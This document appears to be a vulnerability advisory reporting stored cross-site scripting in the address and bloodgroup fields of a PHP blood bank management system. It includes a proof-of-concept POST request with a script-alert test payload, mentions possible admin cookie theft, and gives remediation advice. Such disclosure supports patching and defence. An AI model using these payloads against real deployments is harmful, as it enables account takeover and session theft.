# Stored XSS in Online Blood Bank Management System V1.0



### Affected Product

Online Blood Bank Management System

### Vendor Homepage
[https://itsourcecode.com/free-projects/php-project/online-blood-bank-management-system-in-php-with-source-code/](https://itsourcecode.com/free-projects/php-project/online-blood-bank-management-system-in-php-with-source-code/)

### Affected files/Files used in the Attack

/bloodbank/request.php
/bloodbank/viewrequest.php
/bloodbank/admin/request.php

### Version

1.0

### Vulnerable Software

[https://itsourcecode.com/wp-content/uploads/2021/02/Blood-Bank-Management-System-in-Php-with-Source-Code-1.zip](https://itsourcecode.com/wp-content/uploads/2021/02/Blood-Bank-Management-System-in-Php-with-Source-Code-1.zip)

### Requirements

Authentication: Only low-level access is required to perform the Stored XSS. 

### Additional Items

Escalation of Privileges/Account Takeover may possible via Cookie Stealing. A working payload is still being developed, but retrieving the cookie for the admin user may be possible via XSS and can be utilized by the low level user to escalate privileges. 

### Problem

Cross-Site Scripting (Stored)

### Root Cause

Cross Site Scripting vulnerability was identified in the 'request.php' file of the 'Online Blood Bank Management System' project, that affects both the 'viewrequest.php' and /admin/request.php application components. Malicious code can be injected within both the 'address' and 'bloodgroup' parameters due to improper sanitization, filtering, sanitization and implementation of other XSS prevention mechanisms.

### Impact

Attackers can exploit this to achieve account takeover and obtain a session as the administrative user or other users of the application. 

# Description

In Version 1.0 of the Online Blood Bank Management application, Stored Cross-Site Scripting can be performed from the /request.php page via unknown functionality of the request.php component. An attacker can supply malicious commands to be stored and executed when a user navigates to the 'viewrequest.php' page or when an admin navigates to the /admin/request.php page.  

# Proof-of-Concept

## Sample Request

```
POST /bloodbank/request.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 86
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/bloodbank/request.php
Cookie: PHPSESSID=6bp6hj4uabm82gml4a6qmmqrff
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

fullname=adones&Address=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&bloodgroup=%3Cscript%3Ealert%282%29%3C%2Fscript%3E&phno=1&unit=1&bloodtime=1&request=Request
```

![image](https://github.com/user-attachments/assets/ac57499d-64d1-499c-af4c-5397d03eb7d0)

## Vulnerability Type

Stored Cross Site Scripting

## Vulnerable Location

/bloodbank/request.php page, address & bloodgroup parameters

## Test Payload 
``` <script>alert(1)</script> ```

# Successful Exploitation

![image](https://github.com/user-attachments/assets/128f2c9c-58c0-4b92-b277-9ab69740ad90)
![image](https://github.com/user-attachments/assets/c5537ae9-674c-4d52-8514-cb06f8e54d1a)


 # Remediation

Input validation on arrival should be as strict as possible. Any input that fails validation requirements should be rejected; not sanitized. All user input should be HTML-encoded at any point where it is copied into an application’s response. Any HTML metacharacters (< > “ ‘ and = ) should be replaced with the corresponding HTML entities (&lt; &gt; etc.) In the case where the application’s intended functionality allows users to author content using restricted subsets of HTML tags and attributes, it would be necessary to parse user-supplied HTML to validate there is no dangerous syntax being used. 
